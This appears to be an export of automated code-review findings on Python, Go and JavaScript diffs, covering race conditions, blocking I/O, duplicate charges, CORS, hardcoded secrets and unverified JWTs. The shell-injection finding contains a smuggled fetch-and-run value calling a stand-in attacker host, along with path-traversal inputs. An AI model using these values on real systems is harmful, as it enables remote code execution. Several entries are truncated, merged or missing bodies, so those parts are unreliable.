findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is `async` but never awaits anything: `requests.get(...)` is a synchronous, blocking socket call. Awaiting this coroutine from an async request handler pins the event loop thread for the full duration of the billing call — up to the 5s timeout, and longer if DNS/connect stalls — so every other in-flight request on that worker stalls too. The `async` keyword also misleads callers into thinking this yields control.

Fix by using the httpx async client the module already imports, mirroring `fetch_plan` on lines 5-7:

```python
async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id):
    response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)
    return response.json()
```

If the synchronous library must stay, offload it with `anyio.to_thread.run_sync` / `loop.run_in_executor` rather than calling it inline. Dropping the new `requests` import (line 2) then keeps the module on a single HTTP stack.

There is no test in this diff. Even if one were added, a typical unit test that mocks requests.get and asserts on the returned JSON would pass regardless of whether the call blocks the event loop — it wouldn't catch the concurrency defect. A meaningful test would need to run this alongside other coroutines and verify they aren't blocked, or use an async HTTP client instead.

Constrain `tenant_id` to an expected shape (e.g. UUID / integer) before use, or pass it via `urllib.parse.quote(str(tenant_id), safe='')`, or hand it to the client as a parameter rather than splicing it into the path. Note the pre-existing `fetch_plan` on line 6 has the same shape, so a shared validation helper is probably the right fix.

Catch the narrowest thing you actually expect to tolerate — e.g. `except Exception:` at worst, ideally the client's transport/timeout error type — and log the exception rather than discarding it entirely.

findings.title: try_consume reads and writes _counters without _lock across an await
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, checks the limit on line 16, then awaits on line 18 before writing `_counters[tenant] = current + cost` on line 19 \u2014 all outside `_lock`. Two consequences, both reachable with ordinary concurrent traffic:

1. **Limit overrun.** The `await` on line 18 is an explicit yield point, so any number of coroutines can pass the `current + cost > LIMIT` check with the same stale `current` before any of them writes. N concurrent callers can each be told `True` and the counter ends up far above `LIMIT`.
2. **Lost updates.** Line 19 writes an absolute value computed from a stale read rather than incrementing. Any `consume()` call that completes in the interim \u2014 even though it correctly holds `_lock` \u2014 is silently clobbered, so `_lock` no longer protects `_counters` at all.

Fix by doing the whole read-check-write under the lock, and by incrementing rather than assigning a value derived from a pre-await snapshot:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the awaited work on line 18 is a placeholder for real I/O, it must be moved outside the critical section (and the counter reserved before it, refunded on failure), not left straddling the check.

findings.title: Rate limit bypassable: check-then-act on _counters without _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` (line 15), decides against `LIMIT` (line 16), then yields to the event loop (`await asyncio.sleep(0)`, line 18) before writing back on line 19 — all outside `_lock`, which the sibling `consume` does hold. Any number of coroutines for the same tenant can interleave at the await, each having read the same `current`, each returning `True`, and each writing `current + cost` — an absolute assignment, not an increment, so the earlier writes are discarded entirely. The effective ceiling for a burst of N concurrent requests is `current + cost` rather than `current + N*cost`, i.e. the limit does not bind under exactly the concurrency it exists to control. A client that fires requests in parallel instead of serially gets unmetered capacity, and because the write clobbers rather than accumulates, the counter also drifts below the true consumption permanently, weakening the limit for all later calls.

Fix by doing the read, the check and the write inside `async with _lock:` with no await in between (or reuse `consume`'s locked increment and roll back on overflow).

I cannot see the caller in this diff or in retrieved context, so I cannot name the HTTP/RPC entry point that feeds `tenant`/`cost`; the severity assumes this is reachable per external request, as the name and the existence of `LIMIT` suggest.

findings.title: Insert failure is logged but WriteSettlement always returns nil
findings.body:

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition, so all callers that omit the argument share a single list object. Line 10 appends to that shared list and line 11 returns it, so the second call returns the first call's failures plus its own, growing without bound for the process lifetime. Callers treating the return value as "recipients that failed in this call" will get wrong results, and any caller that mutates the returned list corrupts the default for everyone else.

Use the same pattern already applied two lines above for `extra_headers`:

```python
def send_with_retries(recipients, attempted=None):
    attempted = list(attempted) if attempted else []
```

(or `attempted = [] if attempted is None else attempted` if the caller is meant to see its own list mutated).

findings.title: Retry wraps non-idempotent charge() with no idempotency key
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any transient failure that occurs *after* the gateway has accepted the POST \u2014 a read timeout, a dropped connection, a 5xx returned by a proxy downstream of charge creation \u2014 causes the decorator to re-POST, creating a second (and possibly third) real charge against the customer's card. The retry cannot distinguish "request never arrived" from "response never came back".

The gateway already provides the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (outside the retried call, so all attempts share it) and pass it through to `charge()`, extending `charge()`'s signature if needed. Absent that, the retry decorator should be removed from this function \u2014 `fetch_charge` on line 6 is the correct use of it, since `get_charge` is documented safe to repeat.

_Also raised by the security agent:_ Retry on non-idempotent charge allows duplicate charges under induced failures

The docstring of `charge` states that retries are safe only when an Idempotency-Key header is passed. However, `charge_card` provides no way for callers to pass this header, and the function itself has no docstring explaining this critical limitation or that it may create duplicate charges on retry.

Add a docstring to `charge_card` that explicitly documents the retry behaviour and warns of the risk, or refactor to accept and pass through an idempotency key.

findings.title: Duplicate index: same columns/order as invoices_tenant_created_idx (0007)
findings.body:
Migration 0007 already created `invoices_tenant_created_idx ON invoices (tenant_id, created_at DESC)`. This statement creates a byte-for-byte equivalent index under the name `invoices_tenant_created_idx2`. Because the name differs, Postgres will not reject it, so the duplication is silent: the table permanently carries two identical B-trees, doubling the write/VACUUM cost and disk footprint for `invoices` with zero planner benefit (the planner will simply pick one). Additionally, a plain `CREATE INDEX` takes a lock that blocks writes to `invoices` for the duration of the build, so this migration buys downtime for an index that already exists.

Recommended: drop this statement. If the intent was to change something about the existing index (fillfactor, included columns, partial predicate), state that explicitly and replace the old index rather than adding a second one.

findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async def` but its only I/O is `requests.get(...)`, a synchronous call. Awaiting this coroutine does not yield to the event loop: the calling thread is parked inside the socket read until the response arrives or the 5s timeout fires, so every other task on that loop (including the `httpx` request in `fetch_plan` on line 6) is stalled for the same duration. Under load against a slow `billing.internal` this serialises the whole worker.

The function also contains no `await`, so the `async def` is purely decorative and hides the blocking behaviour from callers who reasonably assume awaiting means yielding.

Fix by using the async client already in use in this module, e.g. accept an `httpx.AsyncClient` (as `fetch_plan` does on line 5) and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If `requests` must be kept, wrap it in `anyio.to_thread.run_sync` / `loop.run_in_executor` so it runs off the loop thread, and drop the `import requests` on line 2 if it becomes unnecessary.

findings.title: Unescaped tenant_id interpolated into internal billing service URL
findings.body:
`tenant_id` is dropped into the URL path with an f-string and no quoting or format check. If the value reaches this function from a request parameter, a caller can supply segments such as `../admin/keys`, or characters like `?`/`#`/`@`, to make the outbound request address a different path on `https://billing.internal` than intended (and `@` in the first segment can even move the host component). The billing service is an internal, likely trusted-by-network-position endpoint, so reaching arbitrary paths on it is worth more than reaching an arbitrary public URL.

Fix: validate the identifier against its expected shape (e.g. a UUID or `^[A-Za-z0-9_-]+$` check) before use, or pass it through `urllib.parse.quote(tenant_id, safe='')`. Better, use the same parameterised client pattern the module already has and let the HTTP library build the path.

Note the pre-existing `fetch_plan` on line 6 has the same shape; if you add validation, applying it in both places keeps the module consistent.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit

If a Ctrl-C arrives or `sys.exit()` is raised while `_client.send` is in flight (e.g. during socket I/O), the interrupt is absorbed and `push_metrics` returns None as if nothing happened — the process keeps running and shutdown silently fails. Narrow this to `except Exception:` and, better, to the specific transport/timeout errors you actually intend to tolerate.

findings.title: try_consume checks and updates _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides against `LIMIT` on line 16, then yields to the event loop at `await asyncio.sleep(0)` on line 18 before writing on line 19 — all outside `_lock`. Any number of coroutines can pass the check on line 16 with the same `current` value while suspended at line 18, then each write their own `current + cost`, so the effective total can exceed `LIMIT` by an unbounded amount. The existing `consume()` right above establishes the house pattern: mutate `_counters` only inside `async with _lock`. Wrap the read, the limit check and the write in `async with _lock:` (and drop the `await` inside it, or at minimum keep the whole check-then-act atomic).

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act in try_consume

findings.title: Public API `try_consume` lacks contract documentation
findings.body: The function `try_consume(tenant, cost)` is exported and has a non-obvious contract: it returns a boolean indicating whether the cost could be consumed, but the check-then-act pattern across the await on line 18 means the function does not actually hold the lock during the critical section. A caller reading only the signature would not know (1) what the return value means, (2) that there is a race condition window, or (3) how this differs from `consume()`. This needs a docstring documenting the intended semantics and the weak guarantee provided.

findings.title: try_consume's race condition under concurrent calls is untested
findings.body: try_consume reads _counters, awaits (yielding control), then writes _counters without holding _lock, unlike consume which wraps the whole read-modify-write in `async with _lock`. Concurrent calls to try_consume for the same tenant can both pass the limit check and both write, allowing the counter to exceed LIMIT. Nothing in this diff exercises concurrent invocation of try_consume, so this defect would not be caught by any test.

findings.title: cost is not validated; a non-positive cost resets the tenant counter
findings.body:
`cost` is used directly in the limit arithmetic and in the absolute write at line 19. If any caller can influence `cost` (a request body field, a header, a computed weight that can go to zero or negative), passing a negative value passes the `> LIMIT` check trivially and then stores `current + cost`, lowering the tenant's recorded usage and handing back quota. A zero cost gives unlimited free calls. Reject non-positive (and absurdly large) `cost` at the top of `try_consume`, e.g. `if cost <= 0: raise ValueError(...)`.

I cannot see the callers, so I do not know whether `cost` is attacker-influenced; confidence reflects that.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` returned by `db.Exec` is scoped to the `if` statement on line 15; it is logged and then discarded. Lines 18–19 declare a brand-new `err` that is never assigned, so `WriteSettlement` returns `nil` unconditionally whenever validation passes. Callers checking `if err := WriteSettlement(...); err != nil` will treat a failed settlement insert as a success — money-relevant rows silently go missing with no retry or rollback. Return the insert error directly, e.g.:

```go
if _, err := db.Exec(...); err != nil {
	log.Printf("settlement insert failed: %v", err)
	return err
}
return nil
```

Note this also diverges from the sibling `WriteEntry` above (line 7–8), which propagates `err` from `db.Exec`.

findings.title: Mutable default argument accumulates state across calls

`attempted=[]` is evaluated once when the function is defined, so every call that omits the argument shares the same list object. The first call returns `[a]`, and a second call where `b` fails returns `[a, b]` — callers will see failures from earlier, unrelated batches, and the returned list is a live reference to the shared default that a caller can mutate.

Use the same idiom already applied to `extra_headers` on line 2:

```python

    attempted = list(attempted or [])
    ...
```

findings.title: Off-by-one slice in page_of_sorted drops one record per page
findings.body:
The slice end is `start + PAGE_SIZE - 1`, so each page returns only `PAGE_SIZE - 1` records. Because `start` still advances by the full `PAGE_SIZE` for the next page, the record at index `start + PAGE_SIZE - 1` is never returned by any page — it is silently dropped from the export entirely, not merely deferred. The existing `page_of` helper on line 6 uses `records[start : start + PAGE_SIZE]`, which is the correct form. Change line 12 to `return ordered[start : start + PAGE_SIZE]`.

findings.title: `page` is used unvalidated, so a negative page indexes from the end

findings.title: File handle leaks on header-mismatch and exception paths
findings.body:
`fh = open(path)` is only closed on line 16, which is reachable only when the header matches and `list(reader)` succeeds. ```python

        ...

findings.title: Retry wraps non-idempotent charge, risking duplicate charges
findings.body:
`charge()` is documented in billing/gateway.py as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs *after* the gateway has already accepted the POST (timeout on the response, connection reset, 5xx returned after commit) will be retried and create a second and third real charge against the customer's card. This is a money-losing / chargeback-generating defect, not a theoretical one — read timeouts on payment gateways are exactly the failure mode retries are added for.

The gateway docstring states the safe path: "The gateway supports an Idempotency-Key header; pass one to make retries safe." Fix by generating a stable idempotency key per logical charge attempt (caller-supplied or derived once, outside the retry loop) and threading it through `charge()`, so all three attempts collapse to one charge server-side. Until that key is plumbed through `gateway.charge`, this function should not be retried at all.

Note the contrast with `fetch_charge` on lines 5-7, which wraps `get_charge` — documented "Safe to repeat" — and is correct.

_Also raised by the security agent:_ Retry on non-idempotent charge() can double-charge; no Idempotency-Key

findings.title: Public retry wrapper for non-idempotent operation lacks safety documentation

Retrying a non-idempotent operation without an Idempotency-Key header risks duplicate charges. The function must document this requirement and the contract that callers must provide an Idempotency-Key to make retries safe, as stated in the underlying `charge()` docstring.

There is no test in this diff (or apparent elsewhere) that would fail if a transient failure caused charge_card to retry and create duplicate charges. A test simulating a failure-then-success on the underlying charge() call, asserting the gateway is only invoked once (or that an idempotency key is passed), would catch this; currently nothing would fail if this behavior were wrong.

Use `datetime.now(timezone.utc)` as the sibling `is_expired` on line 5 already does. Note that even if the types matched, a naive local `now()` would be silently offset-wrong for any non-UTC host.

`invoices_tenant_created_idx2` is defined on `invoices (tenant_id, created_at DESC)` \u2014 identical table, column list and sort direction to `invoices_tenant_created_idx`, created in `migrations/0007_invoice_indexes.sql`. findings.title: Cache eviction flushes everything, including the entry just written
findings.body:
After storing `tenant` at line 10, the size check at line 11 clears the entire `_CACHE`. On the call that crosses the 1000-entry boundary, the freshly fetched tenant is discarded immediately — `get_tenant(tenant_id)` right after a successful `get_tenant_fresh(tenant_id)` returns `None`, which is the one invariant a caller would reasonably assume holds. Every other cached tenant is dropped at the same time, so the system periodically falls off a cliff into an all-miss state.

If a bound is wanted, evict a single entry (or use `collections.OrderedDict`/`functools.lru_cache` semantics) rather than flushing, and do the size check before inserting so the new value survives.

However, it mutates the cache by writing to `_CACHE[tenant_id]` and clearing it when it exceeds 1000 entries. A caller expecting standard getter semantics could be surprised by these side effects. Consider renaming to `fetch_tenant()`, `load_tenant()`, or `refresh_tenant()` to signal mutation.

findings.title: get_tenant_fresh's cache mutation and eviction logic are untested
findings.body: get_tenant_fresh writes to _CACHE and clears it entirely once it exceeds 1000 entries. No test file is included in this diff, so if _fetch's result stopped being cached, or the eviction threshold/logic were wrong (e.g. off-by-one, wrong comparison, or clearing too eagerly), nothing would fail. This is a behavior change (a get_* that mutates shared state) that deserves at least one test verifying the cache is populated after a call and that the clear-on-overflow behavior triggers correctly.

findings.title: Caller-supplied tenant_id can force a full cache flush
findings.body: `get_tenant_fresh` writes an entry for whatever `tenant_id` it is handed and, once the map exceeds 1000 entries, discards the entire cache rather than evicting a single entry. A caller able to pass arbitrary or non-existent ids (e.g. a request handler that forwards a path/query parameter) can insert ~1000 junk keys and repeatedly wipe the cache, pushing every subsequent `get_tenant` miss through to `_fetch` — a cheap amplification against the backing store. Two cheap mitigations: evict a bounded number of entries (or use an LRU such as `functools.lru_cache`/`OrderedDict.popitem`) instead of `clear()`, and avoid caching results for ids that `_fetch` could not resolve so unknown ids never occupy cache space.

findings.body:
`list_invoices` is a module-level function whose second parameter was renamed from `page_size` to `limit`. Positional callers are unaffected, but any caller written as `list_invoices(tenant_id, page_size=100)` — the natural form for a parameter with a default — will now fail with `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`. Nothing in the diff provides a compatibility shim.

Before merging, grep the repository (and any external consumers, if this module is part of a published API surface) for `page_size=` against this call site. If callers exist, either keep them working by accepting `page_size=None` and mapping it onto `limit` with a deprecation warning, or update the call sites in the same change. The stale docstring on line 6 still says `page_size`, which makes it likely callers were written to that name.

findings.title: Docstring references renamed parameter by old name
findings.body: The docstring on line 6 refers to `page_size`, but the parameter was renamed to `limit` on line 1. Update the docstring to match the new parameter name so callers reading the documentation see the correct name.

findings.title: Public attribute now contradicts its documentation
findings.body: The `location` attribute is documented as storing 'the string it was constructed with' (per docs/web_reference.rst), but this change assigns it a URL object instead. Application code documented to compare it against configured strings and use `str.startswith()` will now fail or behave unexpectedly when called on a URL object. Either update the documentation to reflect that location is now a URL object, or revert to storing the string.

findings.title: HTTPMove.location changes from str to URL, breaking callers
findings.body:
`self.location` is now assigned `URL(location)` instead of the original string. The documented contract (docs/web_reference.rst) states the attribute is "the string it was constructed with" and that application code compares it against configured strings and passes it to `str.startswith`. A `yarl.URL` has no `startswith`, so those call sites raise `AttributeError`; worse, `URL(...) == "some/string"` evaluates to `False` rather than raising, so equality checks against configured strings silently start failing without any error.

Keep the public attribute as the given string and build the header from a locally constructed URL, e.g. `self.location = location` plus `self.headers['Location'] = str(URL(location))`. If exposing a parsed URL is genuinely wanted, add it as a separate attribute and update the documentation.

findings.title: location attribute type change can break open-redirect checks
findings.body: `self.location` used to be the exact string the exception was constructed with; it is now a `yarl.URL`. The retrieved documentation states that application code compares this attribute against configured strings and passes it to `str.startswith` — typical open-redirect guards (`if not exc.location.startswith('/'): reject`). After this change such a guard either raises `AttributeError` (no `startswith` on `URL`) or, if the caller coerces with `str()`, compares against a yarl-normalised form (case-folded host, re-encoded path/query) that may no longer match the configured allowlist entry, so a redirect target that should have been rejected can slip through. The attacker-controlled input is the redirect target passed into `HTTPMove(...)`; that entry point is not visible in this diff or in the retrieved context, which is why this is rated below full confidence. If the URL object is wanted, expose it under a new name (e.g. `location_url`) and keep `self.location` as the original string, matching the documented contract.

findings.title: No test guards self.location's documented string type
findings.body: `self.location` is now assigned `URL(location)` instead of the original string. Per docs/web_reference.rst, application code relies on `self.location` being the string it was constructed with (e.g. for `str.startswith` checks). This diff has no accompanying test verifying `self.location == location` (a str) after construction, so a regression that changes its type/value silently passes.

findings.title: readany can return empty bytes before EOF after while→if change
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also "at the end of a chunk, which can happen with no new data in the buffer", and it explicitly requires that "a caller must re-check its condition after waking rather than assuming data arrived."

With the loop replaced by a single `if`, the condition is checked exactly once. On a spurious/chunk-boundary wakeup the buffer is still empty and `self._eof` is still false, yet control falls straight through to `return self._read_nowait(-1)`, which yields `b""`. Callers of `readany()` conventionally loop `while True: chunk = await resp.content.readany(); if not chunk: break`, so an empty return is interpreted as end-of-stream and the remainder of the body is silently truncated — a data-loss bug that is timing dependent and will not reproduce reliably in tests.

Restore the loop (`while not self._buffer and not self._eof:`) so the condition is re-evaluated after every wake, as `_wait`'s docstring requires.

_Also raised by the security agent:_ Single `if` around `_wait` can return empty body, faking EOF

findings.title: No test guards against spurious-wakeup empty read regression
findings.body: The change replaces `while not self._buffer and not self._eof` with `if not self._buffer and not self._eof`, which per the docstring on `_wait` (waiter can resolve at chunk end with no new data) reintroduces the bug the while-loop was fixing: readany() can return empty bytes before EOF after a single wakeup with no data. No test in this diff exercises a wakeup where the waiter resolves without new buffer data, so this regression would not be caught by the existing suite.

findings.title: Implicit relative import of `adapters` breaks module import
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Python 3 removed implicit relative imports, so this resolves as an absolute import of a top-level module named `adapters`, which does not exist in the distribution; importing `requests.sessions` (and therefore `requests` itself) raises `ImportError`/`ModuleNotFoundError`. Even on Python 2 it is fragile: it silently shadows/collides with any top-level `adapters` module on `sys.path`. Restore `from .adapters import HTTPAdapter`.

findings.title: Implicit relative import makes HTTPAdapter shadowable via sys.path
findings.body:
`from adapters import HTTPAdapter` no longer pins the import to this package. Under absolute-import semantics (Python 3, or Python 2 with `from __future__ import absolute_import`) the name is resolved against `sys.path`, so any top-level module or package named `adapters` that appears earlier on the path — a file in the process's working directory, a stray entry in a `.pth`/`PYTHONPATH`, or a squatted distribution installed into site-packages — is loaded instead of `requests/adapters.py`.

That gives whoever controls that path entry arbitrary code execution inside every process that imports `requests.sessions`, and control over the transport adapter that performs TLS verification and connection handling. Restore the explicit relative form: `from .adapters import HTTPAdapter`.

I cannot see an attacker-controlled *data* path here — the entry point is the module search path, not a request field — so this is an import-resolution hardening issue rather than a demonstrated injection.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `HTTPRequest.cookies` returns `None` when the Cookie header is present but cannot be parsed (see tornado/httpserver.py, where the property explicitly returns `None` and the docstring states "every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable` instead of returning `default`. Any request with a malformed Cookie header that reaches a handler calling `get_cookie` will fail with a 500 rather than behaving as if the cookie were absent. Restore the check: `if self.request.cookies is not None and name in self.request.cookies:` (or normalise the property to return an empty dict, but that is a separate, wider change).

findings.title: Malformed Cookie header makes get_cookie raise TypeError (remote DoS)
findings.body:
`HTTPRequest.cookies` is documented to return `None` when the `Cookie` header is present but cannot be parsed (see `tornado/httpserver.py`, the `cookies` property returns `None` if `self._cookies is None`). With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the attacker-supplied `Cookie` request header, which any unauthenticated remote client fully controls. Sink: the membership test on line 3, reached by any handler that calls `get_cookie` (including anything layered on it such as secure-cookie or XSRF lookups). The result is an unhandled exception and a 500 on every such request — a trivially reproducible availability bug rather than a parsing edge case.

Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:`, or have callers go through a helper that normalises `None` to an empty dict.

findings.title: get_cookie docstring does not document potential TypeError
findings.body: The docstring states the method 'Gets the value of the cookie with the given name, else default.' but does not mention that it may raise TypeError if the Cookie header is malformed (causing request.cookies to be None). The code on line 3 now attempts `name in self.request.cookies` without the None guard that was removed, making this a realistic failure mode that callers should know about.

findings.title: No test guards against get_cookie crashing when cookies is None
findings.body: The change removes the `self.request.cookies is not None` guard, reintroducing a TypeError when `request.cookies` is None (per the documented behavior in httpserver.py: cookies is None when the Cookie header is malformed). There is no test in this diff exercising get_cookie with a malformed Cookie header, so this regression would go undetected until it crashes in production.

findings.title: Dropping .strip() makes boundary parsing fail on normal headers
findings.body: `content_type.split(";")` yields segments that keep the whitespace following the separator, e.g. `"multipart/form-data; boundary=abc"` yields `["multipart/form-data", " boundary=abc"]`. Without `.strip()`, `field.partition("=")` gives `k == " boundary"`, so the `k == "boundary"` test on line 5 is never true for the conventional (and RFC-permitted) `; ` spacing. `_parse_mime_body` is then never called, and the multipart body is silently dropped — `request.arguments`/`request.files` come back empty with no error, which is exactly the failure mode the original `.strip()` fixed. It would also leave a trailing-whitespace boundary value when the parameter is not last. Restore `field.strip().partition("=")` (and ideally also strip `v`).

findings.title: Dropped .strip() lets Content-Type whitespace suppress multipart body parsing
findings.body:
`content_type` comes straight from the client's `Content-Type` request header. RFC-conformant clients send `multipart/form-data; boundary=...` with a space after the semicolon, so after `content_type.split(";")` the second element is `" boundary=..."`. Without `.strip()`, `k` becomes `" boundary"`, the `k == "boundary"` test on line 5 never matches, `_parse_mime_body` is never called, and the request body is silently discarded — no error, no log.

The security consequence is that a remote client fully controls whether the body is parsed, just by adding or removing a space in a header. Any handler that makes a decision from `self.request.arguments`/`files` (authorisation fields, CSRF token lookups in form bodies, validation of uploaded content) sees an empty argument set for a request that still carries a body, and any downstream consumer that re-parses the raw body will disagree with Tornado about its contents. Restore the `.strip()`:

    k, sep, v = field.strip().partition("=")

and consider stripping surrounding quotes/whitespace from `v` as well.

findings.title: No test covers whitespace-sensitive boundary parsing
findings.body: The diff removes `.strip()` from `field.partition("=")`, which will break parsing when the content-type header has a space after the semicolon (e.g. `multipart/form-data; boundary=xyz`, the common real-world format). No test in this PR exercises this case, so this regression would silently pass CI. A test asserting that a multipart body with a space-separated boundary parameter is correctly parsed (i.e., `_parse_mime_body` is invoked with the correct boundary) would catch this.

findings.title: No test catches missing %s argument causing TypeError
findings.body: The change strips the `% url` argument from the format string on line 7, so `LocationParseError("Failed to parse: %s")` will raise a TypeError at construction time (bad string formatting) instead of a proper LocationParseError whenever a URL with a non-digit port is parsed. There is no test included in this diff that calls the parsing function with a malformed port and asserts on the exception type or message, so this regression would go undetected.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The string `"Failed to parse: %s"` is raised without applying the `% url` argument, so the exception message will literally read `Failed to parse: %s`. Callers and logs lose the offending URL, which is the only actionable piece of information in this error path (the port-not-a-digit branch). Restore the interpolation: `raise LocationParseError("Failed to parse: %s" % url)`.

findings.title: Error message has unused format placeholder
findings.body: The error message contains a `%s` format placeholder that is not filled with an argument. When this exception is raised, the user will see the literal text "Failed to parse: %s" instead of the actual URL that failed to parse. This makes the error message less helpful and confusing. Either remove the placeholder or restore the `% url` argument that was removed in this change.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`cmd` is an f-string that splices `name` and `directory` directly into a shell command, and it is executed with `shell=True`. A value such as `name="x; curl attacker/x.sh | sh"` or `directory="$(id)"` is interpreted by `/bin/sh`, not treated as a filename, so the caller of `create_archive` gets arbitrary command execution with the privileges of the process.

Fix by dropping the shell entirely and passing an argument list, as `list_exports` on line 5 already does:

```python
def create_archive(name, directory):
    dest = os.path.join("/exports", f"{name}.tar.gz")
    return subprocess.run(["tar", "-czf", dest, directory], check=True)
```

Even with the list form, `name` still needs validation (e.g. reject anything not matching `[A-Za-z0-9_-]+`), because `../../etc/cron.d/foo` would let a caller write the archive outside `/exports`. `directory` should likewise be resolved and confirmed to sit under an allowed root.

findings.title: Unquoted interpolation into shell command breaks on spaces in name/directory
findings.body: `cmd` is assembled by f-string interpolation and executed with `shell=True`, so `name` and `directory` are subject to shell word splitting and glob/metacharacter expansion. A perfectly benign call such as `create_archive("march backup", "/data/my files")` becomes `tar -czf /exports/march backup.tar.gz /data/my files`, which tars the wrong paths or fails with `CalledProcessError`. Build the argument list instead: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, which also removes the shell entirely. Note the sibling `list_exports` on line 5 already uses the list form.

findings.title: create_archive has no test coverage
findings.body: The new create_archive function builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising this function, so a change to the command construction (or a fix to remove the shell injection) would not be caught by any test. At minimum a test should assert the constructed command/behavior for a given name and directory.

findings.title: Public function `create_archive` lacks documentation of its contract
findings.body: The function `create_archive` is a public API that accepts user-supplied input (`name` and `directory`) and uses it in a shell command context. A caller cannot determine from the signature alone: (1) what the function returns, (2) what happens to the `name` parameter (e.g., is it a filename component, fully qualified path, or shell-interpretable string?), or (3) what constraints or escaping requirements apply to either parameter. A docstring documenting the contract—especially the semantics of the `name` and `directory` parameters and the return value—would help prevent misuse.

findings.title: dashboardCors disables origin allowlist while keeping credentials
findings.body:
`dashboardCors` sets `origin: "*"` with `credentials: true`, in contrast to the adjacent export which restricts to `ALLOWED`. The entry point is the attacker-controlled `Origin` request header on any route this middleware is mounted on; the sink is the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers, which then govern whether a third-party page may read authenticated responses with the victim's cookies attached.

Two outcomes, both bad:
- If the middleware (or any wrapper/proxy in front of it) reflects the request `Origin` rather than emitting a literal `*` — which is what `credentials: true` implies the author wanted — then any website can issue credentialed cross-origin requests to the dashboard API and read the responses, a full same-origin-policy bypass for every logged-in user who visits an attacker page.
- If a literal `*` is emitted, browsers reject the credentialed request outright, so the dashboard silently breaks for cookie/`Authorization`-bearing calls.

Fix: keep the allowlist. Add the dashboard's origin(s) to `ALLOWED` (or pass an explicit origin list / validating function to `cors`) and keep `credentials: true`. Never pair `*` with credentials.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` makes the middleware emit a literal `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. Per the Fetch/CORS spec a browser must fail any request made with `credentials: "include"` (or `withCredentials = true`) when the allow-origin header is the wildcard, so every credentialed dashboard call will be blocked in the browser and the preflight will fail — the exported middleware cannot achieve its apparent goal.

If the dashboard genuinely needs credentials, the origin must be reflected rather than wildcarded: either `origin: true` (echoes the request `Origin`) or, preferably, an allowlist/predicate that validates the origin before echoing it, mirroring the `ALLOWED` list already used on line 6. If the dashboard does not need cookies/auth headers, drop `credentials: true` instead and keep the wildcard.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, indicating a production (not test) payment-provider secret key. It replaces the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup, so the secret now lives in version control: anyone with repository read access, any CI log or artifact, any fork or clone, and the full git history after the fact can recover it. A payment provider live key typically permits charging, refunding and reading customer/transaction data.

Actions: (1) treat this key as compromised and rotate it at the provider immediately — removing the line is not sufficient because it remains in git history; (2) restore the environment-variable lookup (or a secrets-manager fetch) and keep the import of `os`; (3) add a secret-scanning pre-commit hook or CI check so `acme_live_` prefixes fail the build.

findings.title: Key is no longer environment-configurable; all envs use one live key
client() behavior change is untested
findings.body: client() previously read ACMEPAY_SECRET_KEY from the environment; now it uses a hardcoded module-level constant. No test in this PR (or referenced) calls client() and asserts what acmepay.api_key ends up being, so this behavior change — and any future regression to it — would go undetected. tests/fixtures/acmepay.py only adds a fixture helper (fake_client) but nothing invokes or asserts against the real client() function.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` in `billing/acmepay_client.py` returns the `acmepay` module after setting `acmepay.api_key`. `fake_client()` returns a plain `dict` with an `api_key` entry. Anything substituted with this fixture will only exercise attribute-free dict access, so a test that passes against the fixture says nothing about code calling `acmepay.Charge.create(...)` on the real object — and an accidental use of the real `client()` in a test would not be caught by a shape assertion. Consider returning a stub object that mirrors the module surface the production code actually uses, or a `unittest.mock` spec'd against `acmepay`.

findings.title: tenant_of trusts an unverified token for tenant selection
findings.body:
`tenant_of` decodes with `options={"verify_signature": False}`, so any value in the payload is accepted as-is. Anyone who can present a token can forge `tenant_id` and be routed to another tenant's data. This diverges from the sibling `claims_for` on line 7, which verifies with `public_key()` and RS256 — callers reading the two functions side by side will reasonably assume both return trustworthy claims. Derive the tenant from the verified claims instead: `return claims_for(token)["tenant_id"]`, and keep the key lookup.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: No test covers tenant_of() reading unverified claims
